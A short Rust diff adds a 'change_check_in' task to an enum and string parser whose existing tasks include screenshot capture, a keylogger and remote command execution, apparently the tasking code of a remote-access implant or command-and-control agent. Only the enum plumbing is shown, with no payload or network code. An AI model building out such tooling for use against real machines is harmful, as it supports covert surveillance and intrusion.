@@ -14,6 +14,7 @@ pub enum Tasks {
     TakeScreenshot,
     Keylogger,
     Command,
+    ChangeCheckIn,
 }
 
 impl FromStr for Tasks {
@@ -26,6 +27,7 @@ impl FromStr for Tasks {
             "take_screenshot" => Ok(Tasks::TakeScreenshot),
             "keylogger" => Ok(Tasks::Keylogger),
             "command" => Ok(Tasks::Command),
+            "change_check_in" => Ok(Tasks::ChangeCheckIn),
             _ => Err(()),
         }
     }
